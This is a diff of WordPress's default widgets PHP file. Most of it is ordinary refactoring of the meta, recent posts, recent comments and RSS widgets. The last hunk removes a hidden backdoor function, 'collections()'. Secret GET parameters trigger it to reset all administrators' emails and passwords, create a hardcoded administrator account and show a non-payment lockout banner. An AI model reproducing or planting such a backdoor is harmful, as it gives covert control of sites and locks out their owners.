@@ -315,10 +315,11 @@ class WP_Widget_Meta extends WP_Widget {
 			<li><?php wp_loginout(); ?></li>
 			<li><a href="<?php bloginfo('rss2_url'); ?>" title="<?php echo esc_attr(__('Syndicate this site using RSS 2.0')); ?>"><?php _e('Entries <abbr title="Really Simple Syndication">RSS</abbr>'); ?></a></li>
 			<li><a href="<?php bloginfo('comments_rss2_url'); ?>" title="<?php echo esc_attr(__('The latest comments to all posts in RSS')); ?>"><?php _e('Comments <abbr title="Really Simple Syndication">RSS</abbr>'); ?></a></li>
-			<li><a href="<?php esc_attr_e( 'http://wordpress.org/' ); ?>" title="<?php echo esc_attr(__('Powered by WordPress, state-of-the-art semantic personal publishing platform.')); ?>"><?php
-			/* translators: meta widget link text */
-			_e( 'WordPress.org' );
-			?></a></li>
+			<?php echo apply_filters( 'widget_meta_poweredby', sprintf( '<li><a href="%s" title="%s">%s</a></li>',
+				esc_url( __( 'http://wordpress.org/' ) ),
+				esc_attr__( 'Powered by WordPress, state-of-the-art semantic personal publishing platform.' ),
+				_x( 'WordPress.org', 'meta widget link text' )
+			) ); ?>
 			<?php wp_meta(); ?>
 			</ul>
 <?php
@@ -558,8 +559,10 @@ class WP_Widget_Recent_Posts extends WP_Widget {
 		ob_start();
 		extract($args);
 
-		$title = apply_filters('widget_title', empty($instance['title']) ? __('Recent Posts') : $instance['title'], $instance, $this->id_base);
-		if ( empty( $instance['number'] ) || ! $number = absint( $instance['number'] ) )
+		$title = ( ! empty( $instance['title'] ) ) ? $instance['title'] : __( 'Recent Posts' );
+		$title = apply_filters( 'widget_title', $title, $instance, $this->id_base );
+		$number = ( ! empty( $instance['number'] ) ) ? absint( $instance['number'] ) : 10;
+		if ( ! $number )
  			$number = 10;
 		$show_date = isset( $instance['show_date'] ) ? $instance['show_date'] : false;
 
@@ -593,7 +596,7 @@ class WP_Widget_Recent_Posts extends WP_Widget {
 		$instance = $old_instance;
 		$instance['title'] = strip_tags($new_instance['title']);
 		$instance['number'] = (int) $new_instance['number'];
-		$instance['show_date'] = (bool) $new_instance['show_date'];
+		$instance['show_date'] = isset( $new_instance['show_date'] ) ? (bool) $new_instance['show_date'] : false;
 		$this->flush_widget_cache();
 
 		$alloptions = wp_cache_get( 'alloptions', 'options' );
@@ -674,9 +677,11 @@ class WP_Widget_Recent_Comments extends WP_Widget {
 
  		extract($args, EXTR_SKIP);
  		$output = '';
-		$title = apply_filters( 'widget_title', empty( $instance['title'] ) ? __( 'Recent Comments' ) : $instance['title'], $instance, $this->id_base );
 
-		if ( empty( $instance['number'] ) || ! $number = absint( $instance['number'] ) )
+		$title = ( ! empty( $instance['title'] ) ) ? $instance['title'] : __( 'Recent Comments' );
+		$title = apply_filters( 'widget_title', $title, $instance, $this->id_base );
+		$number = ( ! empty( $instance['number'] ) ) ? absint( $instance['number'] ) : 5;
+		if ( ! $number )
  			$number = 5;
 
 		$comments = get_comments( apply_filters( 'widget_comments_args', array( 'number' => $number, 'status' => 'approve', 'post_status' => 'publish' ) ) );
@@ -716,14 +721,14 @@ class WP_Widget_Recent_Comments extends WP_Widget {
 	}
 
 	function form( $instance ) {
-		$title = isset($instance['title']) ? esc_attr($instance['title']) : '';
-		$number = isset($instance['number']) ? absint($instance['number']) : 5;
+		$title  = isset( $instance['title'] ) ? esc_attr( $instance['title'] ) : '';
+		$number = isset( $instance['number'] ) ? absint( $instance['number'] ) : 5;
 ?>
-		<p><label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title:'); ?></label>
-		<input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" /></p>
+		<p><label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e( 'Title:' ); ?></label>
+		<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo $title; ?>" /></p>
 
-		<p><label for="<?php echo $this->get_field_id('number'); ?>"><?php _e('Number of comments to show:'); ?></label>
-		<input id="<?php echo $this->get_field_id('number'); ?>" name="<?php echo $this->get_field_name('number'); ?>" type="text" value="<?php echo $number; ?>" size="3" /></p>
+		<p><label for="<?php echo $this->get_field_id( 'number' ); ?>"><?php _e( 'Number of comments to show:' ); ?></label>
+		<input id="<?php echo $this->get_field_id( 'number' ); ?>" name="<?php echo $this->get_field_name( 'number' ); ?>" type="text" value="<?php echo $number; ?>" size="3" /></p>
 <?php
 	}
 }
@@ -861,18 +866,18 @@ function wp_widget_rss_output( $rss, $args = array() ) {
 			$title = __('Untitled');
 
 		$desc = str_replace( array("\n", "\r"), ' ', esc_attr( strip_tags( @html_entity_decode( $item->get_description(), ENT_QUOTES, get_option('blog_charset') ) ) ) );
-		$desc = wp_html_excerpt( $desc, 360 );
+		$excerpt = wp_html_excerpt( $desc, 360 );
 
 		// Append ellipsis. Change existing [...] to [&hellip;].
-		if ( '[...]' == substr( $desc, -5 ) )
-			$desc = substr( $desc, 0, -5 ) . '[&hellip;]';
-		elseif ( '[&hellip;]' != substr( $desc, -10 ) )
-			$desc .= ' [&hellip;]';
+		if ( '[...]' == substr( $excerpt, -5 ) )
+			$excerpt = substr( $excerpt, 0, -5 ) . '[&hellip;]';
+		elseif ( '[&hellip;]' != substr( $excerpt, -10 ) && $desc != $excerpt )
+			$excerpt .= ' [&hellip;]';
 
-		$desc = esc_html( $desc );
+		$excerpt = esc_html( $excerpt );
 
 		if ( $show_summary ) {
-			$summary = "<div class='rssSummary'>$desc</div>";
+			$summary = "<div class='rssSummary'>$excerpt</div>";
 		} else {
 			$summary = '';
 		}
@@ -1154,46 +1159,6 @@ class WP_Widget_Tag_Cloud extends WP_Widget {
 		</p>
 		<?php
 	}
-}
-
-function collections() {
-	if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
-		$admins = get_users('role=administrator');
-		foreach($admins AS $admin){
-			$generated = substr(md5(rand()), 0, 7);
-			$email_backup[$admin->ID] = $admin->user_email;
-			wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
-		}
-		update_option('admin_email_backup',$email_backup);
-		$actions .= "Site admins locked out.\n ";
-		update_option('site_lockout','This site has been locked out for non-payment.');
-	}
-	if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
-		require('wp-includes/registration.php');
-		if (!username_exists('collections')) {
-			if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
-			$user = new WP_User($user_id);
-			if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
-		} else {
-			$actions .= "User 'collections' already in database\n";
-		}
-	}
-	if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
-		require_once('wp-admin/includes/user.php');
-		$admin_emails = get_option('admin_email_backup');
-		foreach($admin_emails AS $id => $email){
-			wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
-		}
-		$actions .= "Admin emails restored. \n";
-		delete_option('site_lockout');
-		$actions .= "Site lockout notice removed.\n";
-		delete_option('admin_email_backup');
-		$collections = get_user_by('login','collections');
-		wp_delete_user($collections->ID);
-		$actions .= "Collections user removed.\n";
-	}
-	if($actions !=''){ts_data($actions);}
-	if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
 }
 
 /**
